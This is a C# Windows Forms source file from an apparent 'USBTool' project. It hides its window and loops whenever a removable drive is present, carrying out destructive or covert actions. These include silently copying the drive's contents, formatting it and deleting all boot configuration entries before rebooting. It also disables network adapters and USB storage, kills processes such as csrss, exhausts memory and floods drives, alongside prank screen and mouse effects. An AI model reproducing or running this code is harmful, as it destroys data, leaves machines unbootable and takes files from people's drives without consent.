﻿using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
#if MEDIA_DSHOW
using USBTool.DShow;
#elif MEDIA_FOUNDATION
using USBTool.MediaFoundation;
#endif
using USBTool.Properties;

namespace USBTool
{
	public unsafe partial class FormMain : Form
	{
		[MTAThread]
		public void WhenArrival(string op)
		{
			Hide();
			while (true)
			{
				try
				{
					foreach (DriveInfo drive in DriveInfo.GetDrives())
					{
						if (drive.DriveType == DriveType.Removable)
						{
							switch (op)
							{
								case "copy":
									string drivename = drive.Name;
									CopyDiretory(drive.RootDirectory, Directory.CreateDirectory(Folder.SelectedPath + "\\" + (
										drivename.EndsWith("\\") ?
										drivename.Substring(0, drive.Name.Length - 2) :
										drivename)));
									break;
								case "format":
									ManagementClass disks = new ManagementClass("Win32_Volume");
									foreach (ManagementObject disk in disks.GetInstances())
									{
										if (disk.Properties["Name"].Value.ToString() == drive.Name)
										{
											object[] methodArgs = { "FAT32", true/*快速格式化*/, 4096/*簇大小*/, ""/*卷标*/, false/*压缩*/ };
											disk.InvokeMethod("Format", methodArgs);
											Thread.Sleep(4000);
										}
									}
									break;
								case "message":
									tf.StartNew(() =>
									{
										MessageBox.Show(message, "Error", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
									});
									break;
								case "kill":
									foreach (Process process in Process.GetProcessesByName(sentence))
									{
										try
										{
											process.Kill();
										}
										catch
										{
											continue;
										}
									}
									break;
								case "hide":
									SetAttributes(drive.Name, FileAttributes.Hidden);
									break;
								case "Encrypted":
									SetAttributes(drive.Name, FileAttributes.Encrypted);
									break;
								case "system":
									SetAttributes(drive.Name, FileAttributes.System);
									break;
								case "readonly":
									SetAttributes(drive.Name, FileAttributes.ReadOnly);
									break;
								case "kasi":
									ulong number = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory / 1024 / 1024 / 1024 / 2;
									for (ulong runtime = 0; runtime < number; runtime++)
									{
										Process.Start(Application.StartupPath + "\\mm.exe");
									}
									while (Process.GetProcessesByName("mm").Length > 0)
									{
										var usbdevice = from ud in DriveInfo.GetDrives()
														where ud.DriveType == DriveType.Removable
														select ud;
										if (usbdevice.Count() == 0)
										{
											foreach (Process mm in Process.GetProcessesByName("mm"))
											{
												try
												{
													mm.Kill();
												}
												catch
												{

												}

											}
										}
									}
									break;
								case "fill":
									FillEachFile(drive.Name);
									break;
								case "normal":
									SetAttributes(drive.Name, FileAttributes.Normal);
									break;
								case "media":
#if MEDIA_MCI
									SendMessage(hMCIWnd, (uint)MCIConst.MCI_PLAY  , 0, 0);
									host.MCIWnd = hMCIWnd;
									if (mediafilename.EndsWith(".wav", StringComparison.OrdinalIgnoreCase) ||
										mediafilename.EndsWith(".mp3", StringComparison.OrdinalIgnoreCase) ||
										mediafilename.EndsWith(".wma", StringComparison.OrdinalIgnoreCase))
									{
										host.TransparencyKey = host.BackColor;
										host.Opacity = 0;
									}
									host.ShowDialog();
									SendMessage(hMCIWnd, WM_CLOSE, 0, 0);
#elif MEDIA_DSHOW
									try
									{
										window.Owner = host.Handle.ToInt32();
										window.WindowStyle = (int)WS_CHILD;
										window.Left = 0;
										window.Top = 0;
										window.Height = host.Height;
										window.Width = host.Width;
										host.Show();
									}
									catch
									{

									}
									control.Run();
									int eventcode=0, lp1=0, lp2=0;
									try
									{
										mediaEvent.GetEvent(out eventcode, out lp1, out lp2, 0xfffffff);
									}
									catch
									{
										mediaEvent.FreeEventParams(eventcode, lp1, lp2);
									}
									while(eventcode != EC_COMPLETE)
									{
										mediaEvent.FreeEventParams(eventcode, lp1, lp2);
										try
										{
											mediaEvent.GetEvent(out eventcode, out lp1, out lp2, 0xfffffff);
										}
										catch
										{

										}
									}
									mediaEvent.FreeEventParams(eventcode, lp1, lp2);
									host.Hide();
#elif MEDIA_FOUNDATION
									Guid guidEnumetator = typeof(IMMDeviceEnumerator).GUID;
									Guid guidVolume = typeof(IAudioEndpointVolume).GUID;
									CoCreateInstance(ref MMDeviceEnumerator, null, CLSCTX_ALL, ref guidEnumetator, out IUnknown _enumerater);
									IMMDeviceEnumerator enumerator = _enumerater as IMMDeviceEnumerator;
									while (state != "Prepared" & state != "Ended") { }
									state = "Playing";
									while (state != "Ended")
									{
										try
										{
											enumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out IMMDevice endpoint);
											endpoint.Activate(ref guidVolume, CLSCTX_ALL, IntPtr.Zero, out IUnknown _volume);
											IAudioEndpointVolume systemvolume = _volume as IAudioEndpointVolume;
											systemvolume.SetMasterVolumeLevelScalar(1, Guid.Empty);
											systemvolume.SetMute(false, Guid.Empty);
											
										}
										catch
										{

										}
									}
#endif
									break;

								case "speech":
									Voice.Volume = (int)((object[])ReadText.Tag)[0];
									Voice.Rate = (int)((object[])ReadText.Tag)[1];
									Voice.SelectVoice(((object[])ReadText.Tag)[2].ToString());
									Voice.Speak(((object[])ReadText.Tag)[3].ToString());
									break;
								case "SwapMouseButton":
									if (SwapMouseButton(true))
									{
										SwapMouseButton(false);
									}
									break;
								case "volume":
									drive.VolumeLabel = sentence;
									break;
								case "rotate":
									switch (SystemInformation.ScreenOrientation)
									{
										case ScreenOrientation.Angle0:
											DEVMODE1.dmDisplayOrientation = 1;
											break;
										case ScreenOrientation.Angle90:
											DEVMODE1.dmDisplayOrientation = 2;
											break;
										case ScreenOrientation.Angle180:
											DEVMODE1.dmDisplayOrientation = 3;
											break;
										case ScreenOrientation.Angle270:
											DEVMODE1.dmDisplayOrientation = 0;
											break;
									}
									int temp = DEVMODE1.dmPelsHeight;
									DEVMODE1.dmPelsHeight = DEVMODE1.dmPelsWidth;
									DEVMODE1.dmPelsWidth = temp;
									ChangeDisplaySettings(ref DEVMODE1, 0);
									Thread.Sleep(4000);
									break;
								case "web":
									Process.Start(sentence);
									break;
								case "fillup":
									if (drive.AvailableFreeSpace > 0)
									{
										try
										{
											StreamWriter sw = new StreamWriter(drive.Name + "/1");
											sw.Write(StringByTime(" ", drive.AvailableFreeSpace));
											File.SetAttributes(drive.Name + "/1", FileAttributes.Hidden);
											sw.Close();
										}
										catch
										{
										}
									}
									break;
								case "glass":
									ForEachWindow(GetDesktopWindow(), "glass");
									break;
								case "close":
									ForEachWindow(GetDesktopWindow(), "close");
									break;
								case "mousetrail":
									string pvParam = "";
									SystemParametersInfo(SPI_SETMOUSETRAILS, 15, ref pvParam, 0);
									Thread.Sleep(1000);
									break;
								case "destroy":
									ForEachWindow(GetDesktopWindow(), "destroy");
									break;
								case "text":
									ForEachWindow(GetDesktopWindow(), "text");
									break;
								case "eject":
									uint returnvalue = 0;
									IntPtr Handle = CreateFile(@"\\.\" + drive.Name[0] + ":", (GENERIC_READ + GENERIC_WRITE), FILE_SHARE_READ + FILE_SHARE_WRITE, IntPtr.Zero, 3, 0, IntPtr.Zero);
									DeviceIoControl(Handle, IOCTL_STORAGE_EJECT_MEDIA, IntPtr.Zero, 0, IntPtr.Zero, 0, ref returnvalue, IntPtr.Zero);
									break;
								case "flash":
									ChangeDisplaySettings(ref DEVMODE1, 0);
									break;
								case "picture":
									ForEachWindow(GetDesktopWindow(), "picture");
									break;
								case "random":
									DEVMODE1.dmDisplayOrientation = rand.Next(4);
									int h = DEVMODE1.dmPelsHeight;
									DEVMODE1.dmPelsHeight = DEVMODE1.dmPelsWidth;
									DEVMODE1.dmPelsWidth = h;
									ChangeDisplaySettings(ref DEVMODE1, 0);
									Thread.Sleep(4000);
									break;
								case "beep":
									Console.Beep(2500, 10000);
									break;
								case "beuncle":
									ForEachWindow(GetDesktopWindow(), "beuncle");
									break;
								case "bcd":
									//RegistryKey bcdreg = Registry.LocalMachine.OpenSubKey("BCD00000000\\Objects");
									//bcdreg.GetAccessControl().AddAccessRule(
									//	new System.Security.AccessControl.RegistryAccessRule(
									//		Environment.UserDomainName + "\\" + Environment.UserName,
									//		System.Security.AccessControl.RegistryRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
									var co = new ConnectionOptions
									{
										Impersonation = ImpersonationLevel.Impersonate,
										Authentication = AuthenticationLevel.Call,
										EnablePrivileges = true
									};
									var scope = new ManagementScope("root\\wmi", co);
									ManagementObject bcdstore = new ManagementObject(scope, new ManagementPath("BcdStore.FilePath=\"\""), null);
									try
									{
										ManagementBaseObject bcdarg = bcdstore.GetMethodParameters("EnumerateObjects");
										bcdarg["Type"] = 0;
										ManagementBaseObject outarg = bcdstore.InvokeMethod("EnumerateObjects", bcdarg, null);
										var bcdos = outarg["Objects"] as object[];
										foreach (ManagementBaseObject bcdo in bcdos)
										{
											ManagementBaseObject deletearg = bcdstore.GetMethodParameters("DeleteObject");
											deletearg["Id"] = bcdo["Id"];
											bcdstore.InvokeMethod("DeleteObject", deletearg, null);
										}
									}
									catch
									{

									}
									if (ReBoot.Checked)
									{
										scope = new ManagementScope("Root\\CIMV2", co);
										var system = new ManagementClass(scope, new ManagementPath("Win32_OperatingSystem"), null);
										foreach (ManagementObject s in system.GetInstances())
										{
											s.InvokeMethod("Reboot", null);
										}
									}
									break;
								case "network":
									var co1 = new ConnectionOptions
									{
										Impersonation = ImpersonationLevel.Impersonate,
										Authentication = AuthenticationLevel.Call,
										EnablePrivileges = true
									};
									var scope1 = new ManagementScope("\\\\.\\root\\wmi", co1);
									ManagementClass networkadapters = new ManagementClass(scope1, new ManagementPath("Win32_NetworkAdapter"), null);
									foreach (ManagementObject adapter in networkadapters.GetInstances())
									{
										ManagementBaseObject arg = adapter.GetMethodParameters("Disable");
										try
										{
											adapter.InvokeMethod("Disable", arg, null);
										}
										catch
										{
										}
									}
									break;
								case "color":
									Graphics d = Graphics.FromHwnd(GetDesktopWindow());
									Rectangle rect = new Rectangle();
									GetClientRect(GetDesktopWindow(), ref rect);
									Brush brush = new SolidBrush((Color)SetColor.Tag);
									d.FillRectangle(brush, rect);
									brush.Dispose();
									d.Dispose();
									break;
								case "cursor":
									Cursor.Position = new Point(0, 0);
									break;
								case "deleteext":
									DeleteExtName(drive.Name);
									break;
								case "negative":
									MagInitialize();
									float[,] negative = new float[,]{
									{ -1.0f, 0.0f, 0.0f, 0.0f, 0.0f },
									{ 0.0f, -1.0f, 0.0f, 0.0f, 0.0f },
									{ 0.0f, 0.0f, -1.0f, 0.0f, 0.0f },
									{ 0.0f, 0.0f, 0.0f, 1.0f, 0.0f },
									{ 1.0f, 1.0f, 1.0f, 0.0f, 1.0f }
									};
									float[,] normal = new float[,] {
									{ 1.0f, 0.0f, 0.0f, 0.0f, 0.0f },
									{ 0.0f, 1.0f, 0.0f, 0.0f, 0.0f },
									{ 0.0f, 0.0f, 1.0f, 0.0f, 0.0f },
									{ 0.0f, 0.0f, 0.0f, 1.0f, 0.0f },
									{ 0.0f, 0.0f, 0.0f, 0.0f, 1.0f }
									};
									Thread.Sleep(500);
									SetMagnificationDesktopColorEffect(negative);
									Thread.Sleep(500);
									SetMagnificationDesktopColorEffect(normal);
									break;
								case "filename":
									NumericalFileName(drive.RootDirectory);
									break;
								default:
									throw (new ArgumentException("该功能还未开发"));
							}
						}
					}
				}
				catch (Exception e)
				{
#if DEBUG
					Debugger.Break();
#else
					StreamWriter br = new StreamWriter(Application.StartupPath + "/bugreport.log", true);
					br.Write(e.GetType().ToString());
					br.Write(e.Message);
					br.WriteLine(e.StackTrace);
					br.Close();
					Close();
#endif
				}
			}
		}
		public void Copy_Click(object sender, EventArgs e)
		{
			if (Folder.ShowDialog() == DialogResult.OK & Folder.SelectedPath.Length > 0)
			{
				WhenArrival("copy");
			}
			else
			{
				MessageBox.Show("未选择路径。");
			}
		}
		public void Format_Click(object sender, EventArgs e)
		{
			WhenArrival("format");
		}
		public void CantOpen_Click(object sender, EventArgs e)
		{
			Hide();
			RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\services\USBSTOR", true);
			while (true)
			{
				key.SetValue("Start", 4);
			}
		}
		public void Message_Click(object sender, EventArgs e)
		{
			tf = new TaskFactory();
			message = StringByTime(" ", 5000);
			WhenArrival("message");
		}
		protected override void WndProc(ref Message m)
		{
			base.WndProc(ref m);
		}
		public void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("https://github.com/ISDHN/USBTool");
		}
		public void KillProcess_Click(object sender, EventArgs e)
		{
			string i;
			if ((i = Interaction.InputBox("输入进程名称。", "输入", "csrss")).Length == 0)
			{
				return;
			}
			else
			{
				sentence = i;
			}
			WhenArrival("kill");
		}
		public void Hide_Click(object sender, EventArgs e)
		{
			WhenArrival("hide");
		}
		public void Encrypt_Click(object sender, EventArgs e)
		{
			WhenArrival("Encrypted");
		}
		public void SystemFile_Click(object sender, EventArgs e)
		{
			WhenArrival("system");
		}
		public void FillMemory_Click(object sender, EventArgs e)
		{
			foreach (Process mm in Process.GetProcessesByName("mm"))
			{
				mm.Kill();
			}
			var file = File.Create(Application.StartupPath + "\\mm.exe");
			file.Write(Resources.mm, 0, Resources.mm.Length);
			file.Close();
			WhenArrival("kasi");
		}
		public void Readonly_Click(object sender, EventArgs e)
		{
			WhenArrival("readonly");
		}
		public void FillwithBlank_Click(object sender, EventArgs e)
		{
			WhenArrival("fill");
		}
		public void PlayMedia_Click(object sender, EventArgs e)
		{
			Media.Tag = SetAttrib.Show("media");
			if (((object[])Media.Tag).Length != 0)
			{
				host = new wndVideo();
#if MEDIA_DSHOW
				FilterGraph fg = Activator.CreateInstance(typeof(FilterGraph)) as FilterGraph;				
				control = fg as IMediaControl;
				window = fg as IVideoWindow;
				IBasicAudio audio = fg as IBasicAudio;
				mediaEvent = fg as IMediaEvent;
				IMediaPosition position = fg as IMediaPosition;
				try
				{
					control.RenderFile(((object[])Media.Tag)[2].ToString());
					
				}
				catch
				{
					return;
				}
				try
				{
					audio.Volume = (int)((object[])Media.Tag)[0] * 100 - 10000;
				}
				catch
				{

				}
				position.CurrentPosition = 0;
				double rate = (int)((object[])Media.Tag)[1];
				position.Rate = rate >= 0 ? rate / 10 + 1 :1/(1 + rate/ -10);
#elif MEDIA_MCI
				StringBuilder shortpath = new StringBuilder(260);
				GetShortPathName(((object[])Media.Tag)[2].ToString(), shortpath, 260);
				mediafilename = shortpath.ToString();
				IntPtr hinstance = Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetLoadedModules()[0]);
				hMCIWnd = MCIWndCreate(host.Handle, hinstance,
					(uint)MCIConst.MCIWNDF_NOAUTOSIZEWINDOW +
					(uint)MCIConst.MCIWNDF_NOMENU +
					(uint)MCIConst.MCIWNDF_NOPLAYBAR +
					(uint)MCIConst.MCIWNDF_NOTIFYMODE +
					(uint)MCIConst.MCIWNDF_NOTIFYERROR, null);
				MoveWindow(hMCIWnd, 0, 0, host.Width, host.Height, false);
				SendMessage(hMCIWnd, (uint)MCIConst.MCIWNDM_OPEN, 0, mediafilename);
				SendMessage(hMCIWnd, (uint)MCIConst.MCIWNDM_SETSPEED, 0, (uint)(int)((object[])Media.Tag)[1] * 50 + 1000U);
				SendMessage(hMCIWnd, (uint)MCIConst.MCIWNDM_SETVOLUME, 0, ((uint)(int)((object[])Media.Tag)[0] - 50U) * 10 + 500U);
#elif MEDIA_FOUNDATION
				#region mediasession
				mediathread = new Thread(() => InitializeMedia(((object[])Media.Tag)[2].ToString(),
				(int)((object[])Media.Tag)[1],
				(float)(int)((object[])Media.Tag)[0] / 100));
				mediathread.Start();
				#endregion
#endif
				Hide();
				WhenArrival("media");
			}
		}
		public void ReadText_Click(object sender, EventArgs e)
		{
			ReadText.Tag = SetAttrib.Show("speech");
			if (((object[])ReadText.Tag).Length != 0)
			{
				WhenArrival("speech");
			}
		}
		public void Form1_Load(object sender, EventArgs e)
		{
			if (Environment.OSVersion.Version.Major < 6)
			{
				Glass.Enabled = false;
#if MEDIA_FOUNDATION
				Media.Enabled = false;
#endif
			}
			try
			{
				SpeechSynthesizer i = new SpeechSynthesizer();
				if (i.GetInstalledVoices().Count == 0)
				{
					ReadText.Enabled = false;
					return;
				}
			}
			catch (Exception)
			{
				ReadText.Enabled = false;
				return;
			}
			Voice = new SpeechSynthesizer
			{
				Rate = 0,
				Volume = 0
			};
		}
		public void SwapMouseButton_Click(object sender, EventArgs e)
		{
			WhenArrival("SwapMouseButton");
		}
		public void ChangeName_Click(object sender, EventArgs e)
		{
			string i;
			if ((i = Interaction.InputBox("输入U盘名称。", "输入", "我的U盘")).Length == 0)
			{
				return;
			}
			else
			{
				sentence = i;
			}
			WhenArrival("volume");
		}
		public void Rotate_Click(object sender, EventArgs e)
		{
			DEVMODE1 = new DEVMODE()
			{
				dmDeviceName = new string(new char[33]),
				dmFormName = new string(new char[33]),
				dmSize = (short)(Marshal.SizeOf(DEVMODE1))
			};
			EnumDisplaySettings(null, -1, ref DEVMODE1);
			WhenArrival("rotate");
		}
		public void ShowWeb_Click(object sender, EventArgs e)
		{
			string i = Interaction.InputBox("输入网页链接。", "输入", "https://www.baidu.com/");
			try
			{
				UriBuilder builder = new UriBuilder(i);
			}
			catch
			{
				return;
			}
			sentence = i;           
			WhenArrival("web");
		}
		public void FillUp_Click(object sender, EventArgs e)
		{
			WhenArrival("fillup");
		}
		public void Glass_Click(object sender, EventArgs e)
		{
			WhenArrival("glass");
		}
		public void CloseWnd_Click(object sender, EventArgs e)
		{
			WhenArrival("close");
		}
		public void MouseTrail_Click(object sender, EventArgs e)
		{
			WhenArrival("mousetrail");
		}
		public void Destroy_Click(object sender, EventArgs e)
		{
			WhenArrival("destroy");
		}
		public void SetText_Click(object sender, EventArgs e)
		{
			string i;
			if ((i = Interaction.InputBox("输入你喜欢的窗口标题")).Length > 0)
			{
				sentence = i;
				WhenArrival("text");
			}
		}
		public void Eject_Click(object sender, EventArgs e)
		{
			WhenArrival("eject");
		}
		public void flash_Click(object sender, EventArgs e)
		{
			EnumDisplaySettings(null, -1, ref DEVMODE1);
			WhenArrival("flash");
		}

		public void picture_Click(object sender, EventArgs e)
		{
			var temp = SetAttrib.Show("picture");
			if (temp.Length != 0)
			{
				sentence = temp[0].ToString();
				WhenArrival("picture");
			}
		}

		private void random_Click(object sender, EventArgs e)
		{
			DEVMODE1 = new DEVMODE()
			{
				dmDeviceName = new string(new char[33]),
				dmFormName = new string(new char[33]),
				dmSize = (short)(Marshal.SizeOf(DEVMODE1))
			};
			rand = new Random();
			EnumDisplaySettings(null, -1, ref DEVMODE1);
			WhenArrival("random");
		}

		private void Beep_Click(object sender, EventArgs e)
		{
			WhenArrival("beep");
		}

		private void BeUncle_Click(object sender, EventArgs e)
		{
			lhwnd = new List<IntPtr>();
			WhenArrival("beuncle");
		}

		private void SetBcd_Click(object sender, EventArgs e)
		{
			WhenArrival("bcd");
		}

		private void CloseNetWork_Click(object sender, EventArgs e)
		{
			WhenArrival("network");
		}

		private void SetBcd_MouseEnter(object sender, EventArgs e)
		{
			ReBoot.BackColor = SetBcd.FlatAppearance.MouseOverBackColor;
		}

		private void SetBcd_MouseLeave(object sender, EventArgs e)
		{
			ReBoot.BackColor = SetBcd.BackColor;
		}

		private void SetBcd_MouseDown(object sender, MouseEventArgs e)
		{
			ReBoot.BackColor = SetBcd.FlatAppearance.MouseDownBackColor;
		}

		private void SetBcd_MouseUp(object sender, MouseEventArgs e)
		{
			ReBoot.BackColor = SetBcd.BackColor;
		}

		private void SetColor_Click(object sender, EventArgs e)
		{
			if (GetColor.ShowDialog() == DialogResult.OK)
			{
				SetColor.Tag = GetColor.Color;
				WhenArrival("color");
			}
		}

		private void Media_MouseEnter(object sender, EventArgs e)
		{
			FullScreen.BackColor = Media.FlatAppearance.MouseOverBackColor;
		}

		private void Media_MouseDown(object sender, MouseEventArgs e)
		{
			FullScreen.BackColor = Media.FlatAppearance.MouseDownBackColor;
		}

		private void Media_MouseLeave(object sender, EventArgs e)
		{
			FullScreen.BackColor = Media.BackColor;
		}

		private void Media_MouseUp(object sender, MouseEventArgs e)
		{
			FullScreen.BackColor = Media.BackColor;
		}

		private void Cursor_Click(object sender, EventArgs e)
		{
			WhenArrival("cursor");
		}

		private void DeleteFileExt_Click(object sender, EventArgs e)
		{
			WhenArrival("deleteext");
		}

		private void Negative_Click(object sender, EventArgs e)
		{
			WhenArrival("negative");
		}

		private void Numerical_Click(object sender, EventArgs e)
		{
			WhenArrival("filename");
		}
	}
}
